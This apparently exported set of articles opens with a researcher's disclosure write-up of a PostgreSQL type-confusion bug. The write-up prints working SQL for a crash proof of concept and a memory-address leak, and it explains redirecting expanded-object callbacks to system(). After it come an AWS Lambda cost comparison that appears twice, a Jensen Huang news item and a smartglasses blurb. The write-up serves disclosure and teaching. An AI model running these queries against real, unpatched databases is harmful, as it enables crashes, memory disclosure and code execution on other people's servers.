articles.title: 22-Year-Old PostgreSQL Bug Turned into Remote Code Execution
articles.body:
If you had told me in April 2026 one question “Mehmet, can we use managed PostgreSQL for this project?” would send me into the deepest rabbit hole of my life, I would have laughed.
Months later, I finally found the bottom of that rabbit hole. It was a 22-year-old zero-day in PostgreSQL core.
In this blog post you will read a story of how I ended up uncovering a new class of type-confusion vulnerabilities in PostgreSQL.
This is the 3rd part of blog post series named “Systemic Risks in the Managed PostgreSQL Industry”. For those who have missed the first two part, feel free to start from 1st and 2nd which will give you a complete context of this madness.
TLDR:
I gave PostgreSQL a value inside a composite type, changed the type of one of its fields, and asked it to read the value back. That type confusion led to one of the most reliable memory-corruption exploit I have seen. But I did not start by looking for a PostgreSQL core vulnerability.
I was exploiting pg_clickhouse, and getting that exploit to work left me with a question about how PostgreSQL understands its own data. With an AI agent as my teacher, I worked through the internals one question at a time. Then a seemingly unrelated conversation gave me the idea that connected it all, and eventually I found myself staring at a primitive that had been there for for awhile.
This is the full true story of how those pieces came together, I am sure you will enjoy this story.
Beginning of August 2026
During June and July, I had been exploiting memory-corruption vulnerabilities across several PostgreSQL extensions. One of the extensions that I achieved code execution was pg_clickhouse. That case study has its own story, which I will share in the future.
What matters here is what that exploit forced me to learn. pg_clickhouse translates ClickHouse values into native PostgreSQL values. A ClickHouse Array is not a PostgreSQL array, right ? So the extension had to rebuild its elements as Datum values in the format that PostgreSQL expected. A mistake in that conversion was what eventually gave me a code execution.
This was my first time meeting with things like Datum, OIDs etc in the PostgreSQL universe. I learned only enough to finish the exploit, but one question remained in the back of my mind:
Somewhere around late July, I finally got my head out of the extensions and just followed that question into PostgreSQL core.
Disclaimer: I reported pg_clickhouse oob write + read chain to the vendor and they fixed it at Jun 23.
PostgreSQL Types 101
I started learning with a very simple query. What happens when I run the simplest query SELECT 1337?
While I avoided all the black magic in Postgres internals, I kept this crash course on the basics of data types.
I start with this query.
SET debug_print_parse = on;
SELECT 1337;
The database scanner looks at the query, recognises SELECT as a keyword, and 1337 as an integer token. Then it creates a parse tree for the query. Next, PostgreSQL walks the tree and transforms it into a typed query tree.
{QUERY
   :commandType 1
   :targetList (
      {TARGETENTRY
         :expr
            {CONST
               :consttype 23 
               :consttypmod -1 
               :constlen 4 
               :constbyval true 
               :constisnull false 
               :location 7 
               :constvalue 4 [ 57 5 0 0 0 0 0 0 ]
            }
      }
   )
}
Parse tree looks like above. But I just wanted to better understand things like what is the consttype 23 ? why constvalue has [ 57 5 0 0 0 0 0 0 ]  and where is my 1337 value ? At this point, I asked Opus 5 to prepare me a full deep-dive course on PostgreSQL types.  Spending a few days around there and talking with my agent, whom I named pg_expert taught me these:
consttype   = 23      → int4
constlen    = 4       → four-byte payload
constbyval  = true    → stored by value
constisnull = false   → this is not NULL
constvalue 4 [ 57 5 0 0 0 0 0 0 ] can be converted to hexadecimal, making the value easier to recognize:
57 decimal = 0x39 
5 decimal = 0x05
On my little-endian system, the bytes were stored least-significant first:
39 05 00 00  →  0x00000539  →  1337
So 1337 had not disappeared.  But why do we even have 8 bytes [ 57 5 0 0 0 0 0 0 ] instead of simply 4 bytes ?
That was because constvalue was not declared as an int32. It was declared as a Datum, which was 8 bytes Our value 1337::int4 value stored at the lower four bytes of that generic carrier.
How can that same 8-byte Datum represent a text, an array, or custom types ?
A Datum Does Not Know What It Is
Chatting with my pg_expert agent taught me more. A Datum does NOT know what it represents.
The eight bytes carrying 1337 did not contain a hidden label saying “I am an integer.”. PostgreSQL knew its type only because of this consttype = 23.
That number is an OID (Object IDentifiers) pointing to a row in the pg_type system catalog
SELECT
    oid,
    typname,
    typlen,
    typbyval,
    typalign,
    typinput::regproc,
    typoutput::regproc
FROM pg_type
WHERE oid = 23;
 oid | typname | typlen | typbyval | typalign | typinput | typoutput
-----+---------+--------+----------+----------+----------+-----------
  23 | int4    |      4 | t        | i        | int4in   | int4out
That means the pg_type row shows what the value means and how PostgreSQL will use it. So far, it’s brilliant and easy to understand. But what about the text type ?
SELECT
    oid,
    typname,
    typlen,
    typbyval,
    typinput::regproc,
    typoutput::regproc
FROM pg_type
WHERE oid IN ('int4'::regtype, 'text'::regtype) // <== HERE FILTERIN THE INT4 and TEXT only
ORDER BY oid;
typname | typlen | typbyval | typinput | typoutput
---------+--------+----------+----------+-----------
 int4    |      4 | true     | int4in   | int4out
 text    |     -1 | false    | textin   | textout
For text, typlen = -1 means that the representation have a variable length. And typbyval = false means that the Datum carried a pointer.
Datum ──> pointer ──> variable-length text representation
So the same 8-byte value stores a memory address for the text. Datum can pass the value either by value itself or by reference to it. Nice, I love the elegant abstraction Datums provides!
Unknown is a type!
So far everything makes sense, but I wanted to better understand the  typinput and typoutput columns too. These functions convert the value provided by the query into a native Datum or vice versa. So I ran this again.
SELECT 1337, pg_typeof(1337), pg_column_size(1337);
 ?column? | pg_typeof | pg_column_size
----------+-----------+----------------
     1337 | integer   |              4
But then I added quotation marks to see if PostgreSQL has dynamic type casting/recognition or something:
SELECT pg_typeof('1337');
 pg_typeof
-----------
 unknown
I was a bit confused at this moment. I initially thought unknown meant “PostgreSQL does not know the type.” So I went back to chatting with my pg_expert agent, who is teaching me everything so far. I learned that unknown is an actual PostgreSQL type with OID 705, used for string literals whose final type hasn’t been decided yet!
Again, this makes super sense because PostgreSQL deliberately assigns untyped string literals this temporary type because the same text could eventually become many different things!
SELECT '1337'::int4;
For example, the query supplies the target type int4. PostgreSQL looked up the typinput function for int4 and called int4in() and when its need to be printer it use  int4out()
Critical Thinking: Wait a Minute! The Type Chooses the Code
Up until this point, typinput and typoutput looked like ordinary conversion mechanism to me. pg_type contained many different native functions for many different types.
While learning more about these functions, one detail stayed with me. An output function did not inspect a Datum and discover its type. It simply trusted all the values and flags around the Datum.
int4out() extracted an integer because PostgreSQL had already selected it as the output function for int4. A different output function could interpret the same generic carrier according to completely different rules.
I still remember that, at that very moment, I was actually thinking about the TOCTOU Vulnerabilities class of the web apps I have been exploiting/fixing for years and years.
If I can do this, we might be able to force PostgreSQL to process a Datum created for a completely different type as if it were the type the function expects. Having a type confusion in PostgreSQL can actually give me an opportunity to abuse all the other functions in PostgreSQL internals.
So I went back to learning more about what I can use to force PostgreSQL to natively call different types’ output functions for my int4 value. It turns out that the LANGUAGE internal feature can be used for that purpose.
LANGUAGE internal: Type Confusion I Could Create on Purpose
The LANGUAGE internal allows a superuser to create an SQL function pointing to native code already compiled into PostgreSQL. I created the following one.
CREATE FUNCTION pg_temp.confused_textout(integer)
RETURNS cstring
AS 'textout'
LANGUAGE internal
STRICT;
Then I gave it the same int4 value. and my local-backend crashed!
SELECT pg_temp.confused_textout(1337);
server closed the connection unexpectedly
This probably means the server terminated abnormally before or while processing the request.
I’m pretty sure the PostgreSQL experts reading this wouldn’t be surprised by this crash, but it surprised me a lot!
It sent me in a completely different direction. I built a working exploit using this type-confusion feature to exploit LANGUAGE internal against security extensions deployed by managed PostgreSQL providers. That research eventually became a part of the Part 2 story.
For a while, I moved on and left this type-confusion question behind.
Roughly two weeks later, something completely unrelated brought me back to it.
Detour: Tomatoes and SQL Injection
Let me take a small detour. This Postgres article series is all about telling you my story in the end, isnt it ?
I do not remember the exact date, but during one of our runs or walks, my partner Bilge (Staff Machine Learning Engineer at EDB) and I were discussing second-order SQL injection in the PostgreSQL AI extensions and the possibility of tricking AI features of these extensions to hallucinate and produce malicious SQL queries.
That conversation led to chatting about prepared statements.
I first learned about SQL injection around 2005, and God knows how many times I have exploited it since.
Twenty years later, most libraries and frameworks still rely heavily on string escaping to generate secure SQL queries, even though RDBMSs have a beautiful feature named prepared statements.
I studied them when I was a uni student, mostly to see what could still be exploited even if the target app uses prepared statements. Things like triggering excessive SQL cold parsing and stuff like that.
But more importantly, for years I taught SQL Injection to thousands of my trainees with this concept:
In my version, the SQL query is the recipe and the values are the ingredients. Prepared statements let the database understand the recipe first, then receive the ingredients separately. So even a value like ' OR 1=1 -- may look evil, but it remains data and never gets the chance to rewrite the query.
I had always seen this separation as a security feature. But this time, I noticed something in the middle of the convo with Bilge. Databases can finish all the parsing first and wait for me to execute it. Before execution, I can run whatever query I want.
I can alter types before executing the query!
Uncovering 22-Year-Old PostgreSQL Type-Confusion Primitive
So the idea is simple; I could prepare a query, change something, and execute it later. But change what? PostgreSQL is not gonna let me redefine what the built-in types int4, text, or UUID mean.
I was not thinking about composite types at this point. Honestly, I barely knew what they were. I asked Claude agent pg_expert a much simpler question:
Which PostgreSQL types can I create, use inside a prepared query, and then alter it before running execute ?
That question led me to composite types. In PostgreSQL, a composite type represents the structure of a row. It is essentially a custom, user-defined data type that acts as a container for multiple fields, each with its own name and data type. [1, 2]
CREATE TYPE pg_temp.poc AS (
    key uuid
);
It had its own type OID, but its attributes defined the current row layout. I can change the attribute a type from UUID to another type without replacing the composite type itself.
The Crash
I created a one-field composite where the attribute started as UUID. Then I prepared a query, changed that attribute to bytea, and executed the prepared statement.
CREATE TYPE pg_temp.poc AS (key uuid);
PREPARE pc_crash AS
    SELECT '(01020000-0000-0000-0000-000000000000)'
           ::pg_temp.poc;
ALTER TYPE pg_temp.poc
    ALTER ATTRIBUTE key TYPE bytea CASCADE;
EXECUTE pc_crash;
And the result was a segfault!
client backend was terminated by signal 11: Segmentation fault
DETAIL: Failed process was running: EXECUTE pc_crash;
I knew I had found exactly the kind of type confusion I had been looking for!
I knew this was no longer a superuser-only LANGUAGE internal behaviour I had exploited before.
I knew that I could trigger this crash as a lowest-privileged login role on any PostgreSQL instance. Probably all the Postgres-compatible offerings too (more about this later)
Last but not least, I already knew that controlled UUID bytes reaching the wrong native consumer, bytea in my case, had serious exploitation potential. These two have the most reliable exploit primitive I have seen in the PostgreSQL exploits.
Before diving into the Hacking PostgreSQL internals, we need to learn a few things about PostgreSQL to better understand the rest of the article!
Quick Course: What is BYTEA ?
bytea is PostgreSQL’s data type for storing arbitrary binary data. Internally, it uses a variable-length representation called varlena. PostgreSQL places a small header before the bytes to describe their size and storage format.
Basic concepts of bytea
+----------------------+------------------------+
| 4-byte header       | binary payload         |
+----------------------+------------------------+
The header tells PostgreSQL which representation it is looking at and how large the complete value is.
We do not need to understand every varlena representation. For the rest of this article, we only need to know two things
Inline representation             →   the leading bytes can control the claimed length
External expanded representation  →  the leading bytes can introduce an internal object pointer
For example, a normal inline example of the five ASCII characters hello. That 24 can be decoded as 0x24 >> 2 which is 9. So 4-byte header + 5-byte payload = 9 bytes!
+----------------------+------------------+
| 24 00 00 00        | 68 65 6c 6c 6f     |
| 4-byte header      |      "hello"       |
+----------------------+------------------+
The most important example, external representation, when header starts with 01 PostgreSQL believes the value is not stored inline at all. Instead, it treats the bytes as a reference to an expanded object somewhere in memory.
+------------------+---------------------+----------------------------------+
| 01               | 02                  | 88 77 66 55 44 33 22 11          |
| external marker  | expanded-object tag | ExpandedObjectHeader * pointer   |
+------------------+---------------------+----------------------------------+
So the following data after the header is just object reference pointer instead of the data itself.
Crash and Root Cause Analysis
Lets get back to where we were.
The UUID I supplied contained exactly sixteen bytes, starting with 01 and 02. While attribute a was still UUID, there was nothing special about 01 02 or the fourteen zero bytes following it. They were simply controlled UUID data.
ALTER TYPE changed the current definition of attribute key from uuid to bytea, but it did not convert or rewrite the binary value already stored by the prepared query. During EXECUTE, PostgreSQL still had exactly the same bytes.
When we EXECUTE the query, PostgreSQL need to return the value of our type pg_temp.poc, in order to do that, it calls the composite output function, record_out().
So record_out() looks at the  pg_temp.poc’s attribute key and says ‘That is bytea’ and selects byteaout()
But the data  byteaout()  takes is our old UUID bytes that we can control. This is where the type confusion happens!
All of these means, we can literally create any varlena representation we want by fully controlling the headers and following 12 byte!
PostgreSQL thinks it needs to reach the ExpandedObjectHeader but its address is 00000000 because thats what we have written inside the UUID, therefore local-backend crash.
Before byteaout() could print the value, it first needed to convert this external representation into something it can print. I learned that PostgreSQL calls this process detoasting.
When we run EXECUTE pc_crash, the call path is as follows. The relevant path looked like this
EXECUTE pc_crash
  ├─ record_out()             a: bytea
  ├─ byteaout()               fetch + detoast
  ├─ detoast_external_attr()  01 02 → expanded
  ├─ DatumGetEOHP()           eohptr = NULL
  ├─ EOH_get_flat_size(NULL)
  └─ NULL->eoh_methods        SIGSEGV
PostgreSQL then passed the NULL pointer to EOH_get_flat_size(). The important line inside that function was effectively:
return eohptr->eoh_methods->get_flat_size(eohptr);
eohptr is what we influence and we choose 00000000 in our POC, which is a NULL. Therefore PostgreSQL crashed while trying to read its eoh_methods pointer because it believed it had received a valid external expanded object and followed the normal code path to process it.
The exploitation idea: replacing NULL with our fake object that could make PostgreSQL follow to our own choosen methods!
Hijacking control-flow via Fake ExpandedObjects contains Native Function Pointers
ExpandedObjectMethods contains two native function pointers
typedef struct ExpandedObjectMethods
{
    EOM_get_flat_size_method get_flat_size;
    EOM_flatten_into_method  flatten_into;
} ExpandedObjectMethods;
Normal code uses those methods like this to convert an expanded object into its flat representation whenever it’s needed.
EOH_get_flat_size(ExpandedObjectHeader *eohptr)
{
    return eohptr->eoh_methods->get_flat_size(eohptr);
}
EOH_flatten_into(ExpandedObjectHeader *eohptr,
                 void *result, Size allocated_size)
{
    eohptr->eoh_methods->flatten_into(eohptr, result, allocated_size);
}
This is not normally an attacker-controlled callback interface. These are trusted internal representations created by PostgreSQL. The output functions can assume the pointer, header, and methods table are not malicious.
These are indirect native function calls. PostgreSQL obtains the function addresses from the object’s methods table and then calls them. That is something we can actually use to change the control-flow path.
Before going further, I needed a simple model for the objects involved. I named the two fake objects according to what they represented
H = fake ExpandedObjectHeader
M = fake ExpandedObjectMethods table
So our plan is that the UUID pointed to H, H pointed to M, and M contained the native function addresses that we wanna cal.
Calling system($payload)
The important detail is that PostgreSQL used H twice. Lets remember the actual C code
eohptr->eoh_methods->get_flat_size(eohptr)
  │          │              │          │
  │          │              │          └── argument = H
  │          │              └───────────── function = system@plt
  │          └──────────────────────────── methods table = M
  └─────────────────────────────────────── object = H
First, it treated H as an ExpandedObjectHeader and read the eoh_methods pointer at offset +0x08.
That pointer led to M, where we had placed the address of system(). PostgreSQL then called the selected method and passed the original object pointer, H, as its first argument.
In other words, H helped PostgreSQL find system(), and then the same H was handed to system() as its parameter.
Fortunately, the first eight bytes of H came before the eoh_methods pointer. I could place the NULL-terminated command id>x in those bytes while keeping the address of M at offset +0x08. 
Leaking Memory Addresses and defeating the ASLR with the same primitive
As I have heavily talked about exploiting extensions vulnerabilities on managed-Postgres providers at Part 1, we dont get to read /proc/self/mem due to hardening. Our exploitation plan is very clear but the challenge is we need to leak addresses of these objects. 
I started to chatting with my pg_expert to find more about PostgreSQL operation that could return a pointer-valued data while SQL expected an ordinary integer. The moment I prompted the agent, it went to
It was a twist of fate. I had ended up exactly where the original idea had started.
PostgreSQL Arrays store their element type inside their binary representation. unnest() trusts that internal type when deciding how to extract each element. 
Normally, everything agrees:
SELECT x
FROM unnest(ARRAY['hello']::text[]) AS item(x);
The array says its element is text, so unnest() returns a pointer-valued text Datum and SQL processes it as text.
But what if the array internally says text, while the surrounding SQL contract says bigint ?
Because text is passed by reference, unnest() returns a Datum containing the memory address of the text value! But the surrounding SQL expression expects a by-value bigint, so PostgreSQL prints those same pointer bits as an integer.
In other to say this, we can exploit exactly same type confusion vulnerability to alter the arrays’ text element type to bigint so that unnest() will return the memory address instead of the value! aka leaking memory address!
Creating a PostgreSQL Array data structures with UUID
The smallest PostgreSQL Array needs 48 bytes. A single UUID gives a 16 controlled bytes. So we can simply combine 3 UUIDs next to each other to build exactly 48 byte fully controlled data structer!
The animation above shows how three UUIDs become one 48-byte array carrier. I prepare those bytes while all three attributes are still UUIDs. From there, I exploit the same type confusion for only the first UUID a to bigint[]! 
So unnest() extracts the element as text and returns its pointer, while SQL expects a bigint and exposes that pointer as a memory address. The final +4 skips the text header and lands on my controlled payload.
CREATE TYPE pg_temp.address_carrier AS (
    a uuid,
    b uuid,
    c uuid
);
CREATE FUNCTION pg_temp.leak_address(
    r pg_temp.address_carrier
)
RETURNS bigint
LANGUAGE plpgsql
AS $$
DECLARE
    pointer bigint;
BEGIN
    SELECT x INTO pointer
    FROM unnest(r.a) AS item(x)
    LIMIT 1;
    RETURN pointer + 4;
END
$$;
PREPARE address_leak AS
SELECT to_hex(pg_temp.leak_address(
    '(c0000000-0100-0000-0000-000019000000,01000000-0100-0000-5000-000011223344,55667788-99aa-bbcc-ddee-ff0000000000)'::pg_temp.address_carrier
));
ALTER TYPE pg_temp.address_carrier
    ALTER ATTRIBUTE a TYPE bigint[] CASCADE;
EXECUTE address_leak;
    to_hex    
--------------
 55f2a589ae0c
(1 row)
A direct text to bigint confusion would only reinterpret the old text bytes as an integer. The array was important because it forced PostgreSQL to first produce a real pointer and then expose those same pointer bits as a bigint.
POC Videos
CVE-2026-6460 Umbrella Fix and Variant Analysis of 21 more cases
Once I have reached that point, I started thinking about different scenarios of where we can alter the attribute types before execution. All the other possible ways of keeping the old value alive.
I found the same underlying mistake around RowExpr, JSON conversion caches and different places. 
I reported 21 cases in total.
9 November 2026 The PostgreSQL security commits landed as part of a much larger release containing 52 new CVE.
6 of those 52 CVEs are directly connected to this article.
- CVE-2026-6460 is the main umbrella fix for type confusion. It introduces composite attribute versioning,
- CVE-2026-120142 anonymous RECORD descriptors.
- CVE-2026-120148 backend-local anonymous-RECORD typmod
- CVE-2026-116329 statistics import could publish values under an obsolete type
- CVE-2026-116306 prevents ExecEvalFieldStore[De]Form from using a mismatched
- CVE-2026-120139 integer overflow in tuple-size calculation
Coordinating this with managed-PostgreSQL Providers
The reason why I have fallen into that rabbit hole 5 months ago was because I needed to better understand the how managed-database industry works before making a decision because at the end of the day, we all can outsource the infrastructure but we can not outsource the risk.
So I ported the my locally working exploit to almost every managed PostgreSQL platform I know and privately shared reproducible PoCs with their security teams.
I haven’t seen any vendor who is not affected by this vulnerability! including those who has Postgres compatible offering.
Databricks security team engineers validated all the exploits immediately. Thanks to Aaron and his team.
Google escalated the AlloyDB reports to its highest priority P0. I am genuinely grateful of all the support from Google Cloud VRP team since day one!
SupaBase team received the full details around mid August. Thanks to endless support from the Etienne since I first contacted him.
Ubicloud members reached out to me after my part 1 article published and then they introduced me with the ClickHouse team. Both parties are also read in somewhere at end of August.
AWS Aurora/RDS and Microsoft Azure PostgreSQL teams received the reports and working PoC at mid August.
But what I respected the most is that some vendors brought their most senior engineering members to start implementing their own mitigation. They did not want to leave customers exposed while waiting for the upstream release cycle.
So yeah my whole August was like that.
Closing: Thank you PostgreSQL Communities and Core Security Team
I spent 20 years of my life around security communities around the globe. But I really need to say that the support, positive approach and the respect I have seen my time at PGCONF.eu this year was quite suprized me. Have no idea PostgreSQL community at europe has such a family kind vibe.
After my talk “Nobody Gets to Be Superuser (Until I Broke In)” at PGCONF.eu last month Valencia, I have received amazing support from everyone, specially the respected members of the community who are effortlessly fixing these vulnerabilities whenever someone sends an email to the securit@ address.
I owe so much of where I am today to open source. I’ve spent my life learning by hacking things, understanding how they work, and making them more secure. Being able to contribute to PostgreSQL and its ecosystem in my own way means a lot to me. Seeing those contributions so warmly welcomed means even more.
My talk this year was not recorded upon my request, but I receive a lot of invitation from different countries for their local PostgreSQL meetups.
If you’d like to hear the whole story, I’ll be presenting the 90 minutes edition of it at the Prague PostgreSQL Meetup on Monday, 30 November.
Come join me. I PROMISE IT’LL BE WORTH IT!
https://cloomba.com/e/prague-postgresql-meetup-8-2026-11-30
(If you’ve made it this far, I’d love to hear your thoughts! Feel free to leave a comment or ask me anything.)
Appendix: Dating the Primitive and the Duplicate Fiesta
The mutable-row-type primitive dates to commit 077db40fa1f3, introduced on May 5, 2004 with ALTER TABLE ... ALTER COLUMN ... TYPE.
The exploitation technique I used relies on commit 1dc5ebc9077a, introduced on May 14, 2015, which added expanded-object pointers and their native method callbacks. Later than many other primitives I discovered during exploiting 20+ variants.
I am not claiming that CVE-2026-6460 is exclusively “my vulnerability.” PostgreSQL treated it as an umbrella issue covering a much wider family of composite-type problems. Its commit credits many researchers whose reports may have involved overlapping discoveries, separate variants, or completely different journeys into the same systemic weakness.
That is the reality of vulnerability research in the age of AI. This article only tells the story of how I reached it without any cyber enabled models back in August 2026.
PostgreSQL records the reporters exactly as follows:

articles.title: AWS Lambda Web Functions keep billing memory ~7 minutes after the last request
articles.body:
Why we chose our own compute over AWS Lambda Web Functions
Lambda Web Functions kept billing memory for 5–7 minutes after the last request, so we built our own compute. On the same Next.js app, it answered warm requests 1.5–3× faster and cold-started about 3.5× faster.
When AWS announced Lambda Web Functions in October, I was excited.
At Easel, we'd spent months building infrastructure to run web applications efficiently on traditional Lambda. Native HTTP servers, concurrent requests, and active CPU billing sounded like exactly what we'd been looking for.
If Web Functions worked the way we hoped, we could potentially replace a substantial amount of our custom infrastructure.
So we decided to put them to the test.
A few weeks later, we'd decided to run our own compute instead. And as it turns out, our own infrastructure was faster, too.
The five-minute problem
Our initial experiments were promising. Web Functions handled 300 concurrent requests without errors, and a new function was serving requests in under nine seconds.
But we quickly ran into something that didn't work for us.
AWS documents that Web Functions bill for memory throughout an execution environment's lifetime, even when no requests are running. What the documentation doesn't specify is how long an idle environment will remain alive before being terminated.
In our tests, environments continued running and accruing memory charges for 5–7 minutes after their last request.
Across six representative environments, we measured idle periods of 313–411 seconds. There was no configurable idle timeout to shorten them.
For a 200ms request followed by 345 seconds of inactivity, that's roughly 1,700 times the request duration in metered memory time.
We checked the economics against CloudWatch and AWS Cost Explorer. Across our experiment, memory accounted for approximately 88% of the calculated compute and request costs at published list prices, even though our application only used around 160–210 MB.
The entire experiment amounted to about two cents at list prices. Hardly alarming on its own.
For an application receiving steady traffic, this may not matter much. The same environment can serve many requests, spreading the idle-memory cost across them.
But Easel needs to support thousands of applications with unpredictable traffic, including many that receive only a handful of requests per day. For those workloads, an environment might spend five minutes waiting for traffic after serving a request that took only a few milliseconds.
Multiply that across thousands of independent deployments, and the economics start to look very different.
We even tried terminating environments ourselves after 10 seconds of inactivity. That reduced metered environment time by roughly 20×, but AWS recorded every intentional exit as a runtime failure.
It wasn't something we wanted to rely on in production.
What if we ran the compute ourselves?
Rather than adopt Web Functions, we decided to move application execution onto servers we operate ourselves, keeping traditional Lambda available for overflow.
This gives us control over scheduling and resource allocation. We can share capacity across applications without paying AWS for each idle environment, and scale beyond our own infrastructure when demand requires it.
Our first self-operated compute host went live in US East on November 2, serving applications including Easel's own website.
But taking ownership of the compute raised another question: How would our performance compare to AWS?
We deployed the same Next.js 16 application to both platforms and ran a series of benchmarks from a client in Ashburn, Virginia.
The results surprised us.
Our host delivered 1.5–3× faster median warm-request times across all four workloads.
The difference wasn't limited to network or routing overhead. Running the same 20,000 chained SHA-256 operations took 29.2ms on our host versus 43.8ms on Web Functions, about 1.5× faster.
And cold starts told a similar story.
After leaving both applications idle for 12 minutes, we triggered fresh execution environments on each platform.
In both trials, Easel started serving requests about 3.5× faster.
We also saw an interesting difference after a shorter idle period. Following one five-minute gap, Web Functions had already terminated its environment and needed 908ms to respond. Easel resumed its paused environment and responded in just 14ms.
These are early results from a single region and a small application, not a comprehensive performance study. The cold-start comparison has only two paired samples, and we haven't benchmarked sustained throughput yet.
Still, seeing our own infrastructure outperform AWS across these initial workloads was encouraging.
Taking ownership of the infrastructure
Running our own compute comes with additional responsibilities. We have to manage capacity, handle failures, and make sure resources are distributed efficiently across applications.
But it also gives us the freedom to optimize the entire execution path, rather than working around the constraints of another platform.
Web Functions may be a good fit for applications with sustained traffic, where idle memory costs are less significant. For Easel, the economics of running large numbers of independent applications led us in a different direction.
And our initial benchmarks suggest that the decision doesn't have to come at the expense of performance.
We're taking on more infrastructure complexity so developers using Easel don't have to.
How we measured
- Dates
- Benchmarks ran November 11–12, 2026 (UTC). Idle-memory measurements are from October 26, 2026.
- Setup
- The same Next.js 16 application on Easel's self-operated US East host and on AWS Lambda Web Functions in us-east-1.
- Client
- One client in Ashburn, Virginia.
- Timing
- Time to first byte, excluding TLS connection setup but including network transit and platform routing.
- Samples
- About 100 requests per route per platform for warm requests. Two paired trials for cold starts.
- Hardware
- The platforms ran on different hardware and resource configurations, so these compare deployments, not normalized hardware.
- Pricing
- AWS costs use published list prices.

articles.title: AWS Lambda Web Functions keep billing memory ~7 minutes after the last request
articles.body:
Why we chose our own compute over AWS Lambda Web Functions
Lambda Web Functions kept billing memory for 5–7 minutes after the last request, so we built our own compute. On the same Next.js app, it answered warm requests 1.5–3× faster and cold-started about 3.5× faster.
When AWS announced Lambda Web Functions in October, I was excited.
At Easel, we'd spent months building infrastructure to run web applications efficiently on traditional Lambda. Native HTTP servers, concurrent requests, and active CPU billing sounded like exactly what we'd been looking for.
If Web Functions worked the way we hoped, we could potentially replace a substantial amount of our custom infrastructure.
So we decided to put them to the test.
A few weeks later, we'd decided to run our own compute instead. And as it turns out, our own infrastructure was faster, too.
The five-minute problem
Our initial experiments were promising. Web Functions handled 300 concurrent requests without errors, and a new function was serving requests in under nine seconds.
But we quickly ran into something that didn't work for us.
AWS documents that Web Functions bill for memory throughout an execution environment's lifetime, even when no requests are running. What the documentation doesn't specify is how long an idle environment will remain alive before being terminated.
In our tests, environments continued running and accruing memory charges for 5–7 minutes after their last request.
Across six representative environments, we measured idle periods of 313–411 seconds. There was no configurable idle timeout to shorten them.
For a 200ms request followed by 345 seconds of inactivity, that's roughly 1,700 times the request duration in metered memory time.
We checked the economics against CloudWatch and AWS Cost Explorer. Across our experiment, memory accounted for approximately 88% of the calculated compute and request costs at published list prices, even though our application only used around 160–210 MB.
The entire experiment amounted to about two cents at list prices. Hardly alarming on its own.
For an application receiving steady traffic, this may not matter much. The same environment can serve many requests, spreading the idle-memory cost across them.
But Easel needs to support thousands of applications with unpredictable traffic, including many that receive only a handful of requests per day. For those workloads, an environment might spend five minutes waiting for traffic after serving a request that took only a few milliseconds.
Multiply that across thousands of independent deployments, and the economics start to look very different.
We even tried terminating environments ourselves after 10 seconds of inactivity. That reduced metered environment time by roughly 20×, but AWS recorded every intentional exit as a runtime failure.
It wasn't something we wanted to rely on in production.
What if we ran the compute ourselves?
Rather than adopt Web Functions, we decided to move application execution onto servers we operate ourselves, keeping traditional Lambda available for overflow.
This gives us control over scheduling and resource allocation. We can share capacity across applications without paying AWS for each idle environment, and scale beyond our own infrastructure when demand requires it.
Our first self-operated compute host went live in US East on November 2, serving applications including Easel's own website.
But taking ownership of the compute raised another question: How would our performance compare to AWS?
We deployed the same Next.js 16 application to both platforms and ran a series of benchmarks from a client in Ashburn, Virginia.
The results surprised us.
Our host delivered 1.5–3× faster median warm-request times across all four workloads.
The difference wasn't limited to network or routing overhead. Running the same 20,000 chained SHA-256 operations took 29.2ms on our host versus 43.8ms on Web Functions, about 1.5× faster.
And cold starts told a similar story.
After leaving both applications idle for 12 minutes, we triggered fresh execution environments on each platform.
In both trials, Easel started serving requests about 3.5× faster.
We also saw an interesting difference after a shorter idle period. Following one five-minute gap, Web Functions had already terminated its environment and needed 908ms to respond. Easel resumed its paused environment and responded in just 14ms.
These are early results from a single region and a small application, not a comprehensive performance study. The cold-start comparison has only two paired samples, and we haven't benchmarked sustained throughput yet.
Still, seeing our own infrastructure outperform AWS across these initial workloads was encouraging.
Taking ownership of the infrastructure
Running our own compute comes with additional responsibilities. We have to manage capacity, handle failures, and make sure resources are distributed efficiently across applications.
But it also gives us the freedom to optimize the entire execution path, rather than working around the constraints of another platform.
Web Functions may be a good fit for applications with sustained traffic, where idle memory costs are less significant. For Easel, the economics of running large numbers of independent applications led us in a different direction.
And our initial benchmarks suggest that the decision doesn't have to come at the expense of performance.
We're taking on more infrastructure complexity so developers using Easel don't have to.
How we measured
- Dates
- Benchmarks ran November 11–12, 2026 (UTC). Idle-memory measurements are from October 26, 2026.
- Setup
- The same Next.js 16 application on Easel's self-operated US East host and on AWS Lambda Web Functions in us-east-1.
- Client
- One client in Ashburn, Virginia.
- Timing
- Time to first byte, excluding TLS connection setup but including network transit and platform routing.
- Samples
- About 100 requests per route per platform for warm requests. Two paired trials for cold starts.
- Hardware
- The platforms ran on different hardware and resource configurations, so these compare deployments, not normalized hardware.
- Pricing
- AWS costs use published list prices.

articles.title: Jensen Huang agrees to testify before Congress
articles.body:
Ex-Nvidia CEO Jensen Huang has agreed to testify before Congress, House Foreign Affairs Committee Chairman Brian Mast said on Thursday, according to reports from Bloomberg and NBC News.
Huang, who stepped down as CEO following reports of an alleged affair with a woman suspected of spying for China, agreed to testify Wednesday after several senior lawmakers threatened to subpoena him.
Huang has agreed to testify before Congress by Thanksgiving, which falls later this month.
The development comes after House Republicans Mast, John Moolenaar, and Rick Crawford sent Huang a letter on November 4 requesting that he appear before their committees. Moolenaar chairs the House Select Committee on the Chinese Communist Party, Mast chairs the House Committee on Foreign Affairs, and Crawford chairs the House Intelligence Committee.
“Jensen and I have been very at odds as some of you already know on export controls, but Nvidia is a very important company to the United States of America,” Mast said to reporters. “I don’t want to see anything hurt in Nvidia, but he has some very serious questions to answer.”
The testimony will take place behind closed doors, though Mast said he expects the briefing to be recorded on video and transcribed.

articles.title: Google Pushes Privacy Angle As Gemini-Powered Smartglasses Debut
articles.body:
Google Pushes Privacy Angle As Gemini-Powered Smartglasses Debut (arstechnica.com) 27
			
		 	
				Google is launching its first Gemini-powered smart glasses, with Samsung supplying the computing hardware. Given their built-in 12-megapixel camera, Google is emphasizing privacy protections, including a tamper-resistant recording light, automatic face redaction, and restrictions on real-time facial recognition and livestreaming. The company also promises not to use captured photos or videos for AI training or targeted advertising. Ars Technica reports:  Google says the frames all weigh about 41 grams, which is not terrible but is definitely near the top for glasses generally. They will, naturally, weigh much more when you account for lenses. That will also determine the final pricing. So far, we only have the starting prices for these devices, including non-prescription lenses.
